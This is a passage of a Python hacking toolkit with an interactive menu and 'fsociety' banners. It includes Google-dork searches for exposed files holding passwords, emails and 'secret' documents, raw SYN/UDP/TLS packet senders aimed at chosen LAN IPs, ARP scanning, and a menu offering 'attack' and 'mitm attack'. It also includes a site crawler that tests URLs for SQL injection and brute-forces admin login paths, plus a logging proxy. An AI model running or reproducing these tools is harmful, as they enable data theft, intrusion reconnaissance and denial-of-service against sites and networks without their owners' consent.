            dork2 = [f'site:{site} filetype:{seconde} intext:{secret}' for seconde in ['pdf', 'xls', 'xlsx', 'docx', 'docm', 'dotm', 'xlt', 'zip', 'rar', 'xltm', 'doc', 'sql', 'txt', 'log', 'db'] for secret in ['secret', 'top secret', 'phone number', 'secret plan', 'secret document', 'top document', 'secrets', 'gmail', 'email', 'passwords', 'email,password']]
            with ThreadPoolExecutor(max_workers=50) as execute:
                for dork_1 in dork1:
                    def dorking1():
                        for results in search(dork_1, num=int(2), user_agent=UserAgent().chrome, pause=1, start=0, stop=None):
                            if results:
                                print(f"{colors['second']}[+] {colors['first']}" + results)
                    execute.submit(dorking1)
                for dork_2 in dork2:
                    def dorking2():
                        for results in search(dork_2, num=int(2), user_agent=UserAgent().chrome, pause=1, start=0, stop=None):
                            if results:
                                print(f"{colors['second']}[+] {colors['first']}" + results)
                    execute.submit(dorking2)
        if __name__ == '__main__':
            clear()
            print(logo)
            site = input(f"{colors['second']}[+]{colors['first']} Site: ")
            print('\n')
            try:
                dumping(site)
            except KeyboardInterrupt:
                print('\nExiting..')
                return
    def db_dumperv2():
        logo = f"""
             {colors['first']}________ __{colors['second']}________  ________                                     
             {colors['first']}\\_____{colors['second']}_ \\\\______   \ \\______ \  __ __  _____ ______   ___________ 
              |    |  \|    |  _/  |    |  \|  |  \\/     \\\\____ \\_/ __ \\_  __ \\
              |    `   \    |   \  |    `   \  |  /  Y Y  \  |_> >  ___/|  | \\/
             /_______  /______  / /_______  /____/|__|_|  /   _{colors['first']}_/ \\\___  >__|{colors['second']}   
                     \\/       \\/          \\/            \\/|__{colors['first']}|        \\/       

        """
        def dumping(site, file, included, year):
            print(f"{colors['second']}[+]{colors['first']} Dumping data {site}..")
            dork = [f'site:{site} filetype:{file}, {path}:{included}, {foryear}:{year}' for path in ['intitle', 'intext', 'inlink', 'inurl'] for foryear in ['intext', 'intitle']]
            for dorks in dork:
                def finds():
                    for results in search(dorks, num=int(4), start=0, stop=None, pause=2, user_agent=UserAgent().chrome):
                        print(f"{colors['second']}[+] {colors['first']}" + results)
                with ThreadPoolExecutor(max_workers=50) as execute:
                    execute.submit(finds)
        if __name__ == '__main__':
            clear()
            print(logo)
            site = input(f"{colors['second']}[+]{colors['first']} Site: ")
            file = input(f"{colors['second']}[+]{colors['first']} File[e.g: pdf=xls=xlsx=doc]: ")
            included = input(f"{colors['second']}[+]{colors['first']} Included[e.g: phonenumber,email / email,password]: ")
            year = input(f"{colors['second']}[+]{colors['first']} Year[e.g: 2023,2024]: ")
            print('\n')
            try:
                dumping(site, file, included, year)
            except KeyboardInterrupt:
                print('\nExiting..')
                return
    def crawl():
        def has_query_and_ends_with_number(url):
            parsed = urlparse(url)
            return bool(parsed.query) and re.search(r'\?[^#]*\d+$', url)

        def crawl_with_query_and_number(start_url, max_depth=2):
            visited = set()
            urls_with_query_and_number = []

            def crawl(url, depth):
                if depth > max_depth or url in visited:
                    return

                visited.add(url)
                try:
                    response = requests.get(url)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(url, href)

                        if has_query_and_ends_with_number(full_url):
                            urls_with_query_and_number.append(full_url)

                        if urlparse(full_url).netloc == urlparse(start_url).netloc:
                            crawl(full_url, depth + 1)

                except requests.RequestException as e:
                    print(f"Error accessing {url}: {e}")

            crawl(start_url, 0)
            return urls_with_query_and_number

        start_url = input("Site: ")
        print("Crawling... (Please wait.)")

        try:
            result = crawl_with_query_and_number(start_url)
            for results in result:
                print(results)
        except KeyboardInterrupt:
            print('\nExiting..')
            return
    def l4_dump():
        global source_port, dest_port, os_type, available
        available = None
        os_type = '1' if os.name == 'posix' else '0'
        ip_target = []
        source_port = 0
        dest_port = 0

        def run_as_admin():
            if os_type == 0:
                if ctypes.windll.shell32.IsUserAnAdmin():
                    print("Administrator mode detected, running.")
                else:
                    print("Requesting Administrator Mode...")
                    ctypes.windll.shell32.ShellExecuteW(
                        None, "runas", sys.executable, " ".join(sys.argv), None, 1
                    )
            else:
                pass

        def clear():
            os.system('clear' if os_type == '1' else 'cls')

        def table_print(head, init):
            table_data = [head] + [init]
            table = AsciiTable(table_data)
            print(table.table)

        def l4_tls_header():
            header = '\\x'.join(str(random.choice("abc1234567890=-+")*2) + '\\' for _ in range(1, random.randint(70, 500) + 1))
            return header

        def l4_tls():
            tls_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            head = l4_tls_header()
            tls_socket.sendto(head, (ip_target, dest_port))

        def l4_tcp():
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            global source_port, dest_port
            seq = 1             # Sequence number
            ack_seq = 0         # Acknowledgment number
            offset_res = (5 << 4) | 0  # Data offset dan reserved
            flags = 0x02        # SYN flag
            window = 8192       # Window size
            checksum = 0        # Checksum
            urg_ptr = 0         # Urgent pointer

            tcp_header = struct.pack('!HHLLBBHHH',
                                source_port, dest_port, seq, ack_seq, offset_res,
                                flags, window, checksum, urg_ptr)
            tcp_socket.sendto(tcp_header, (ip_target, dest_port))

        def l4_udp():
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            global source_port, dest_port
            length = 28 
            checksum = 0xABCD

            udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)
            udp_socket.sendto(udp_header, (ip_target, dest_port))

        class execute:
            def scan_network():
                def get_network_info():
                    gateways = psutil.net_if_addrs()
                    default_gateways = psutil.net_if_stats()
                    routes = psutil.net_if_addrs()
                    default = psutil.net_if_addrs()
                    gateway_info = psutil.net_if_addrs()
                    gateway_default = psutil.net_if_stats()

                    for iface_name, addresses in gateway_info.items():
                        for addr in addresses:
                            if addr.family.name == "AF_INET":
                                if iface_name in gateway_default and gateway_default[iface_name].isup:
                                    return iface_name, addr.address
                    return None, None, gateways, default_gateways, routes, default

                def scan_network(ip):
                    arp = ARP(pdst=ip)
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether / arp

                    result = srp(packet, timeout=2, verbose=0)[0]

                    devices = []
                    for sent, received in result:
                        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
                    return devices

                def main():
                    global available
                    iface, gateway = get_network_info()

                    if iface and gateway:
                        print(f"Interface: {iface}")
                        print(f"Gateway: {gateway}")

                        ip_range = '.'.join(gateway.split('.')[:-1]) + '.1/24'
                        print(f"Scanning network: {ip_range}...\n")

                        devices = scan_network(ip_range)
                        if devices:
                            print("Devices found:")
                            for device in devices:
                                print(f"IP: {device['ip']}, MAC: {device['mac']}")
                                available += device['ip']
                        else:
                            print("No device found.\n")
                    else:
                        print("Failed to detect the network interface or gateway.")

                if __name__ == "__main__":
                    main()

            def get_network_interfaces():
                global available
                interfaces = []
                ipsz = []
                ips = []
                mac = []

                processed_ips = set()

                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family.name == "AF_INET":
                            interfaces.append({"Interface": iface})
                            ipsz.append({"IP Address": addr.address})
                            ips.append(addr.address)
                            mac.append({"Mac Address": next((a.address for a in addrs if a.family.name == "AF_LINK"), "Unknown")})

                new_ips = [ip for ip in ips if ip not in processed_ips]
                if new_ips:
                    processed_ips.update(new_ips)

                display_ips = new_ips if new_ips else list(processed_ips)

                available = display_ips
                table_data = [['Interface', 'IP Address', 'Mac Address']]
                for i in range(len(interfaces)):
                    table_data.append([interfaces[i]['Interface'], ipsz[i]['IP Address'], mac[i]['Mac Address']])

                table = AsciiTable(table_data)
                print(table.table)

            def get_default_gateway():
                iface = []
                gateway = []
                gateways = psutil.net_if_addrs()
                for iface_name, iface_info in psutil.net_if_stats().items():
                    if iface_info.isup:
                        for addr in gateways.get(iface_name, []):
                            if addr.family.name == "AF_INET":
                                iface.append({"iface": iface_name})
                                gateway.append({"gateway": addr.address})
                table_data = [['Interface', 'Gateway']]
                for i in range(len(iface)):
                    table_data.append([iface[i]['iface'], gateway[i]['gateway']])
                table = AsciiTable(table_data)
                print(table.table)
                return None

            def scan_wifi():
                system_os = pf.system()
                SSID = []
                BSSID = []
                SIGNAL = []


                try:
                    if system_os == "Windows":
                        result = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"], text=True)
                        networks = result.split("\n")

                        ssid = None
                        for line in networks:
                            line = line.strip()
                            if line.startswith("SSID "):
                                ssid = line.split(":")[1].strip()
                            elif line.startswith("BSSID "):
                                bssid = line.split(":")[1].strip()
                            elif line.startswith("Signal"):
                                signal = line.split(":")[1].strip()
                                SSID.append({"SSID": ssid})
                                BSSID.append({"BSSID": bssid})
                                SIGNAL.append({"Signal": signal})

                    elif system_os == "Linux":
                        result = subprocess.check_output(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL", "dev", "wifi"], text=True)
                        networks = result.strip().split("\n")
                        for network in networks:
                            ssid, bssid, signal = network.split(":")
                            SSID.append({"SSID": ssid})
                            BSSID.append({"BSSID": bssid})
                            SIGNAL.append({"Signal": signal})

                    else:
                        print("OS not supported for Wi-Fi scanning.")
                except Exception as e:
                    print(f"Error scanning Wi-Fi: {e}")

                table_data = [['SSID', 'BSSID', 'Signal Strength']]
                for i in range(len(SSID)):
                    table_data.append([SSID[i]['SSID'], BSSID[i]['BSSID'], SIGNAL[i]['Signal']])
                table = AsciiTable(table_data)
                print(table.table)
                return None

            def sniff_network(ip):
                arp = ARP(pdst=ip)
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                packet = ether / arp

                result = srp(packet, timeout=2, verbose=0)[0]

                ip = []
                mac = []
                for sent, received in result:
                    ip.append({'ip': received.psrc})
                    mac.append({'mac': received.hwsrc})
                if ip:
                    table_print(ip, mac)
                else:
                    table_print(['No results'], ['No results'])
                return None

            def scan_wifi_clients(ip_range):
                try:
                    print(f"Scanning network: {ip_range}")
                    arp = ARP(pdst=ip_range)
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether / arp
                    result = srp(packet, timeout=5, verbose=0)[0]

                    clients = []
                    for sent, received in result:
                        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

                    if not clients:
                        print("No client detected in {}".format(ip_range))
                        return

                    print("Connected client in {}:".format(ip_range))
                    print("IP Address\tMAC Address")
                    print("-" * 40)
                    for client in clients:
                        print(f"{client['ip']}\t{client['mac']}")
                except KeyboardInterrupt:
                    print('\nExiting..')
                    return

            def proxy():
                class ProxyHandler(http.server.BaseHTTPRequestHandler):
                    def do_GET(self):
                        try:
                            parsed_url = urlparse(self.path)
                            if not parsed_url.netloc:
                                self.send_error(400, "Bad Request: Invalid URL")
                                return

                            target_url = f"http://{parsed_url.netloc}{unquote(parsed_url.path)}"
                            if parsed_url.query:
                                target_url += f"?{parsed_url.query}"

                            response = requests.get(target_url)

                            self.send_response(response.status_code)
                            for header, value in response.headers.items():
                                self.send_header(header, value)
                            self.end_headers()
                            self.wfile.write(response.content)
                        except Exception as e:
                            self.send_response(500)
                            self.end_headers()
                            self.wfile.write(f"Error: {e}".encode())

                if __name__ == "__main__":
                    IP = "127.0.0.1"
                    PORT = 8080
                    try:
                        with socketserver.TCPServer((IP, PORT), ProxyHandler) as httpd:
                            print(f"Proxy server running at http://{IP}:{PORT}")
                            httpd.serve_forever()
                    except OSError as e:
                        print(f"Error: {e}")

        class tools:
            def main():
                def set_dns_to_cloudflare():
                    """Set DNS to Cloudflare's 1.1.1.1"""
                    if pf.system() == "Windows":
                        os.system("netsh interface ip set dns name=\"Wi-Fi\" static 1.1.1.1")
                        os.system("netsh interface ip add dns name=\"Wi-Fi\" 1.0.0.1 index=2")
                    elif pf.system() == "Linux":
                        resolv_conf = "/etc/resolv.conf"
                        with open(resolv_conf, "w") as file:
                            file.write("nameserver 1.1.1.1\nnameserver 1.0.0.1\n")
                    else:
                        print("OS aren't supported.")

                def flush_dns():
                    """Flush DNS cache"""
                    if pf.system() == "Windows":
                        os.system("ipconfig /flushdns")
                    elif pf.system() == "Linux":
                        os.system("systemd-resolve --flush-caches")
                    else:
                        print("OS aren't supported")

                def prioritize_wifi():
                    """Prioritize WiFi connection"""
                    if pf.system() == "Windows":
                        os.system("netsh wlan set profileparameter name=\"Wi-Fi\" connectiontype=ESS")
                    else:
                        None

                def optimize_wifi():
                    """Run all optimization steps"""
                    print("Setting DNS to Cloudflare...")
                    set_dns_to_cloudflare()
                    print("Clearing cache DNS...")
                    flush_dns()
                    print("Setting net priority WiFi...")
                    prioritize_wifi()
                    print("Optimization Completed.")

                if __name__ == "__main__":
                    optimize_wifi()

        class monitor:
            def start():
                def load_history(log_file):
                    if os.path.exists(log_file):
                        with open(log_file, 'r') as file:
                            return json.load(file)
                    return []

                def save_log(log_file, data):
                    with open(log_file, 'w') as file:
                        json.dump(data, file, indent=4)

                def scan_network(ip_range):
                    print(f"Scanning network: {ip_range}")
                    arp = ARP(pdst=ip_range)
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether / arp

                    result = srp(packet, timeout=5, verbose=0)[0]

                    devices = []
                    for sent, received in result:
                        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

                    return devices

                def monitor_wifi(ip_range, log_file):
                    print("\nMemulai monitoring WiFi...")

                    log_data = load_history(log_file)
                    if log_data:
                        print(f"{len(log_data)} log history loaded from {log_file}.")
                    else:
                        print("No previous log found, starting fresh.")

                    try:
                        while True:
                            devices = scan_network(ip_range)
                            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                            log_entry = {
                                "timestamp": timestamp,
                                "devices": devices
                            }
                            log_data.append(log_entry)

                            save_log(log_file, log_data)

                            print(f"[{timestamp}] {len(devices)} device(s) detected.")
                            for device in devices:
                                print(f"IP: {device['ip']}, MAC: {device['mac']}")

                            print("\nWaiting 10 seconds before next scan...")
                            time.sleep(10)

                    except KeyboardInterrupt:
                        print("\nMonitoring stopped by user.")

                if __name__ == "__main__":
                    table_print(["Locked IP Address"], ['{}'.format('\n'.join(ip_target))])
                    to_unlock = input("\n[Select IP To Monitor]: ")
                    if to_unlock in ip_target:
                        IP_RANGE = to_unlock

                    LOG_FILE = "log.json"

                    monitor_wifi(IP_RANGE, LOG_FILE)

            def mitm():
                from flask import Flask, request, render_template_string
                from selenium import webdriver
                from selenium.webdriver.chrome.options import Options

                app = Flask(__name__)

                def render_page(url):
                    chrome_options = Options()
                    chrome_options.add_argument("--headless")
                    chrome_options.add_argument("--disable-gpu")
                    chrome_options.add_argument("--no-sandbox")
                    driver = webdriver.Chrome(options=chrome_options)

                    try:
                        driver.get(url)
                        page_source = driver.page_source
                        return page_source
                    except Exception as e:
                        return f"Error: {e}"
                    finally:
                        driver.quit()

                @app.route("/")
                def proxy():
                    target_url = request.args.get("url")
                    if not target_url:
                        return "Masukkan URL di query string. Contoh: ?url=https://www.youtube.com"

                    html_content = render_page(target_url)
                    return render_template_string(html_content)

                if __name__ == "__main__":
                    app.run(debug=False, port=8080)


        def prompt():
            try:
                username = "netsucker"
            except FileNotFoundError:
                raise ValueError('No user file detected!')
            PS1 = f"┌({username}@root - fsociety)-[~/bin]\n┕━>"
            prompt = input(PS1 + '')
            print('')
            return prompt

        class banner:
            def lobby():
                logo = "         ,-.               \n"
                logo += "        / \\\  `.  __..-,O   \n"
                logo += "       :   \\ --''_..-'.'   \n"
                logo += "       |    . .-' `. '.    \n"
                logo += "       :     .     .`.'    \n"
                logo += "        \\     `.  /  ..    \n"
                logo += "         \\      `.   ' .   \n"
                logo += "          `,       `.   \\  \n"
                logo += "         ,|,`.        `-.\\ \n"
                logo += "        '.||  ``-...__..-` \n"
                logo += "         |  |              \n"
                logo += "         |__|              \n"
                logo += "         /||\\              \n"
                logo += "        //||\\\\             \n"
                logo += "       // || \\\\            \n"
                logo += "    __//__||__\\\\\__         \n"
                logo += "   '--------------' SSt    \n"
                logo += "   MrSanZz? Wh0 1s h3>?    \n"
                return logo

        if __name__ == "__main__":
            run_as_admin()
            clear()
            print(banner.lobby())
            execute.scan_network()
            while True:
                option = prompt()
                if option.lower() == 'sniff':
                    for ips in ip_target:
                        execute.sniff_network(ips)
                elif option.lower() == 'scan':
                    execute.scan_wifi()
                elif option.lower() == 'gateway':
                    execute.get_default_gateway()
                elif option.lower() == 'iface':
                    execute.get_network_interfaces()
                elif option.lower() == 'available':
                    try:
                        table_print(['Available IP Address'], ['{}'.format('\n'.join(available))])
                    except:
                        table_print(['Available IP Address'], ['No IP Available, please type iface!'])
                elif option.lower() == 'alock':
                    table_print(['Available IP Address'], ['{}'.format('\n'.join(available))])
                    ip = input('[Insert IP To Lock]: ')
                    ip_target.append(ip)
                    table_print(["Locked IP Address"], ['{}'.format('\n'.join(ip_target))])
                elif option.lower() == 'remv':
                    table_print(["Locked IP Address"], ['{}'.format('\n'.join(ip_target))])
                    to_unlock = input("[Select IP To Unlock]: ")
                    if to_unlock in ip_target:
                        ip_target.remove(to_unlock)
                        print(f"Unlocked! - {to_unlock}")
                    else:
                        print("[!] IP aren't available")
                elif option.lower() == 'locked':
                    table_print(["Locked IP Address"], ['{}'.format('\n'.join(ip_target))])
                elif option.lower() == 'clear':
                    clear()
                    print(banner.lobby())
                elif option.lower() == 'cscan':
                    for ips in ip_target:
                        execute.scan_wifi_clients(ips)
                elif option.lower() == 'boost':
                    tools.main()
                elif option.lower() == 'proxy':
                    execute.proxy()
                elif option.lower() == 'lockall':
                    if available:
                        for ip in available:
                            if ip in ip_target:
                                pass
                            else:
                                ip_target.append(ip)
                        print("Locking all available ip address successfully")
                        table_print(["Locked IP Address"], ['{}'.format('\n'.join(ip_target))])
                    else:
                        print("There's no available ip address currently.")
                elif option.lower() == 'monitor1':
                    monitor.start()
                elif option.lower() == 'monitor2':
                    monitor.mitm()
                elif option.lower() == 'help' or option.lower() == 'h':
                    table_print(['Available Commands'], ['{}'.format('\n'.join(['scan - [scan near wifi]', 'iface - [scanning near iface]', 'gateway - [scanning near gateway]', 'sniff - [sniff ip address(require alock)]', 'attack - [attack locked IP address]', 'alock - [to lock ipaddress target]', 'remv - [remove 1 locked ip address]', 'rall - [remove all locked ip]', 'locked - [view all locked IP address]', 'available - [view all available IP(require iface)]', 'clear - [clear session]', 'boost - [boost ur wi-fi]', 'proxy - [start proxy server]', 'cscan - [scanning locked ip network]', 'lockall - [lock all available ip]', 'monitor1 - [monitor network through traffic]', 'monitor2 - [mitm attack]']))])
    def site_seeker():
        global sql_vuln, admin_paths
        def has_query_and_ends_with_number(url):
            parsed = urlparse(url)
            return bool(parsed.query) and re.search(r'\?[^#]*\d+$', url)

        def crawl_with_query_and_number(start_url, max_depth=2):
            visited = set()
            urls_with_query_and_number = []

            def crawl(url, depth):
                if depth > max_depth or url in visited:
                    return

                visited.add(url)
                try:
                    response = requests.get(url)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    for a_tag in soup.find_all('a', href=True):
                        href = a_tag['href']
                        full_url = urljoin(url, href)

                        if has_query_and_ends_with_number(full_url):
                            urls_with_query_and_number.append(full_url)

                        if urlparse(full_url).netloc == urlparse(start_url).netloc:
                            crawl(full_url, depth + 1)

                except requests.RequestException as e:
                    print(f"Error accessing {url}: {e}")

            crawl(start_url, 0)
            return urls_with_query_and_number

        start_url = input("[+] Site: ")
        print("[+] Crawling.. (Please wait)")

        result = crawl_with_query_and_number(start_url)
        print("[+] SQL Vuln test..")
        for url in result:
            response = requests.get(url+"'")
            if 'SQL syntax;' in response.text:
                sql_vuln.append(url)
            else:
                continue
        print("[+] Looking for admin login page..")
        def start_scanning(url, path):
            admin_path = open(path, 'r').read().split()
            for admin in admin_path:
                try:
                    response = requests.get(url + admin, headers={"User-Agent": UserAgent().chrome}, timeout=7)
                    if response.status_code == 200:
                        admin_paths.append(url+admin)
                    else:
                        continue
                except Timeout:
                    time.sleep(20)
                    continue
                except RequestException:
                    continue
        if __name__ == '__main__':
            url = start_url
            file_path = ['/admin/', '/admin/index.php/', '/admin/home.php/', '/admin/index.html/', '/admin/home.html/', '/admin/dashboard.php/', '/admin/dashboard.html/', '/admin/dashboard/', '/admin/dashboard/index.php/', '/admin/dashboard/index.html/', '/admin/dashboard/home.php/', '/admin/dashboard/home.html/', '/admin/manager/index.php/', '/admin/manager/index.html/', '/admin/manager/home.php/', '/admin/manager/home.html', '/admin/manager/dashbard.php/', '/admin/manager/dashboard.html/', '/admin/manager/dashboard/', '/administrator/index.php/', '/administrator/index.html/', '/administrator/home.php/', '/administrator/home.html/', '/administrator/dashboard.php/', '/administrator/dashboard.html/', '/administrator/dashboard/', '/administrator/', '/cpanel/', '/controlpanel/', ':8080', ':2380', ':2345', '/register/', '/signup/', '/register.php/', '/signup.php/', '/signin.php/', '/login.php/', '/admin/login.php/', '/admin/signin.php/', '/admin/login/', '/dashboard/login/', '/dashboard/login.php/', '/administrator/login/', '/administrator/login.php/', '/administrator/signin.php/', '/administrator/signin/', '/adm/index.php/', '/adm/dashboard.php/', '/adm/index.html/', '/adm/dashboard.html/', '/adm/home.php/', '/adm/home.html/', '/admin/', '/administrator/', '/dashboard/', '/adm/', '/manager/', '/management/', '/admin/management/', '/administrator/management/', '/administrator/manager/']
            try:
                with Pool(20) as mp:
                    mp.map(start_scanning, url, file_path)
            except TypeError:
                with ThreadPoolExecutor(max_workers=40) as executor:
                    futures = [executor.submit(start_scanning, url, file_path)]
            except:
                start_scanning(url, file_path)
        table_print(["Crawl Results"], ["\n".join(i for i in result)])
        table_print(["SQL Vuln Results"], ["\n".join(i for i in sql_vuln)])
        table_print(["Available Admin Page"], ["\n".join(i for i in admin_paths)])
        sql_vuln.clear()
        admin_paths.clear()
    def subdo_finder():
        clear()
        print(f"""

        {colors['first']}███████╗██╗   ██╗██{colors['second']}████╗ ██████╗  ██████╗       ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
        ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗      ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
        ███████╗██║   ██║██████╔╝██║  ██║██║   ██║█████╗█████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
        ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║╚════╝██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
        ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝      ██║     ██║██║ ╚██{colors['first']}██║██████╔╝███████╗██║  ██║
        ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝       ╚═╝     ╚═╝╚═╝  ╚═══╝{colors['first']}╚═════╝ ╚══════╝╚═╝  ╚═╝

              """)
        def find_subdomains(domain):
            print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Scanning subdomain: {domain}\n")
            try:
                url = f"https://crt.sh/?q={domain}&output=json"
                response = requests.get(url)

                if response.status_code == 200:
                    data = json.loads(response.text)
                    subdomains = sorted(set(entry['name_value'] for entry in data))
                    print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Subdomain results:")
                    for subdomain in subdomains:
                        if subdomain[0] != '*':
                            print(subdomain)
                else:
                    print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Failed to get subdo.")

            except Exception as e:
                print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Failed to get subdo.")

        if __name__ == "__main__":
            domain = input(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Enter domain (example: example.com): ").strip()
            find_subdomains(domain)
    def proxy_logger():
        PROXY_HOST = '127.0.0.1'
        PROXY_PORT = 8080
        DNS = input(f"{colors['second']}[{colors['first']}Optional{colors['second']}] {colors['first']}DNS Server [ e.g 1.1.1.1:1.0.0.1 ]: ")
        if DNS:
            DNS_SERVERS = [(DNS.split(':')[0], 53), (DNS.split(':')[1], 53)]
        else:
            DNS_SERVERS = [('1.1.1.1', 53), ('1.0.0.1', 53)]
        print(F"{colors['second']}[{colors['first']}Optional{colors['second']}] {colors['first']}e.g: id.pinterest.com,www.youtube.com,192.168.1.1,172.16.16.1")
        blocked_site = input(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Block address: ").split(',')
        blocked_site = [site.strip() for site in blocked_site if site.strip()]
        if blocked_site:
            blocked_site = blocked_site
        else:
            blocked_site = []
        print(f"{colors['second']}[{colors['first']}+{colors['second']}] {colors['first']}Blocked: {blocked_site}")

        def resolve_domain(domain, port):
            try:
                for dns_server in DNS_SERVERS:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dns_socket:
                            dns_socket.settimeout(2)
                            dns_socket.connect(dns_server)
                            dns_socket.sendall(build_dns_query(domain))
                            response = dns_socket.recv(512)
                            ip_address = extract_ip_from_response(response)
                            return f"{ip_address}:{port}"
                    except Exception as e:
                        continue
                ip_address = socket.gethostbyname(domain)
                return f"{ip_address}:{port}"
            except socket.gaierror as e:
                return f"{color.red()}[{colors['first']}+{color.red()}] {colors['first']}Error: {e}"

        def build_dns_query(domain):
            header = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            question = b''.join((len(part).to_bytes(1, 'big') + part.encode() for part in domain.split('.')))
            question += b'\x00\x00\x01\x00\x01'
            return header + question

        def extract_ip_from_response(response):
            if response[3] == 0:
                return socket.inet_ntoa(response[-4:])
            raise Exception("Invalid DNS Response")

        def is_blocked(address):
            if not blocked_site or blocked_site == ['']:
                return False
            return any(blocked in address for blocked in blocked_site)

        def handle_http(client_socket):
            request = client_socket.recv(16384).decode()

            first_line = request.split("\n")[0]
            method = first_line.split(" ")[0]
            addr = first_line.split(" ")[1].split(":")[0]

            if is_blocked(addr):
                client_socket.sendall(b"HTTP/1.1 403 Forbidden\r\n\r\n")
                client_socket.close()
                print(f"{colors['second']}[{colors['first']}HTTP-LOG{colors['second']}] {colors['first']}Blocked HTTP access from {addr}")
                return

            if method == "CONNECT":
                try:
                    host_port = first_line.split(" ")[1]
                    host, port = host_port.split(":")
                    port = int(port)

                    remote_socket = socket.create_connection((host, port))
                    client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")

                    relay_data(client_socket, remote_socket)
                    handle_tcp(client_socket, host, port)

                    if host:
                        print(f"{colors['second']}[{colors['first']}HTTP-LOG{colors['second']}] {colors['first']}Connected address: "+str(host)+':'+str(port)+" Method: "+str(method))
                        print(f"{colors['second']}[{colors['first']}HTTP-LOG{colors['second']}] {colors['first']}Client requests: "+str(first_line))
                        print(f"{colors['second']}[{colors['first']}HTTP-LOG{colors['second']}] {colors['first']}Headers: ")
                        print(request)
                        resolved_address = resolve_domain(addr, port)
                        print(f"{colors['second']}[{colors['first']}RESOLVED{colors['second']}] {colors['first']}{resolved_address}")
                    else:
                        pass

                except Exception as e:
                    print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']}HTTP: {e}")
                    client_socket.close()
                return
            else:
                print(f"{colors['second']}[{colors['first']}HTTP-LOG{colors['second']}] {colors['first']}HTTP request: ")
                print(request)
                client_socket.close()

        def udp_associate(client_socket):
            try:
                request = client_socket.recv(262)
                if len(request) < 10:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']} Invalid UDP ASSOCIATE request")
                    client_socket.close()
                    return

                address_type = request[3]

                if address_type == 1:
                    address = socket.inet_ntoa(request[4:8])
                    port = struct.unpack('!H', request[8:10])[0]
                elif address_type == 3:
                    domain_length = request[4]
                    address = request[5:5 + domain_length].decode()
                    port = struct.unpack('!H', request[5 + domain_length:5 + domain_length + 2])[0]
                else:
                    print(f"{color.red()}[{colors['first']}SOCKS5-LOG{color.red()}] {colors['first']} Unsupported address type for UDP")
                    client_socket.close()
                    return

                print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}UDP Associate: {address}:{port}")

                udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                udp_socket.bind(('0.0.0.0', 0))
                local_port = udp_socket.getsockname()[1]
                response = b"\x05\x00\x00\x01" + socket.inet_aton(PROXY_HOST) + struct.pack('!H', local_port)
                client_socket.sendall(response)

                print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}UDP relay aktif di port {local_port}")

                def udp_relay():
                    while True:
                        data, addr = udp_socket.recvfrom(4096)

                        if addr[0] == client_socket.getpeername()[0]:
                            udp_socket.sendto(data[3:], (address, port))
                            print(f"{colors['second']}[{colors['first']}UDP-LOG{colors['second']}] {colors['first']}From Client: {data[3:].hex()}")

                        else:
                            header = b"\x00\x00\x00\x01" + socket.inet_aton(addr[0]) + struct.pack('!H', addr[1])
                            udp_socket.sendto(header + data, client_socket.getpeername())
                            print(f"{colors['second']}[{colors['first']}UDP-LOG{colors['second']}] {colors['first']}From Server: {data.hex()}")

                threading.Thread(target=udp_relay).start()

            except Exception as e:
                print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']}UDP Associate: {e}")
                client_socket.close()

        def handle_tcp(client_socket, target_host, target_port):
            try:
                remote_socket = socket.create_connection((target_host, target_port))
                print(f"{colors['second']}[{colors['first']}TCP-LOG{colors['second']}] {colors['first']} Connected to {target_host}:{target_port}")

                threading.Thread(target=relay_data, args=(client_socket, remote_socket)).start()
                threading.Thread(target=relay_data, args=(remote_socket, client_socket)).start()

            except Exception as e:
                print(f"{color.red()}[{colors['first']}ERROR{color.red()}] {colors['first']}TCP Proxy: {e}")
                client_socket.close()

        def handle_socks5(client_socket):
            handshake = client_socket.recv(2)
            print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Handshake: {handshake}")

            if len(handshake) != 2 or handshake[0] != 5:
                print(f"{colors['second']}[{colors['first']}SOCKS5-LOG{colors['second']}] {colors['first']}Invalid SOCKS5 handshake")
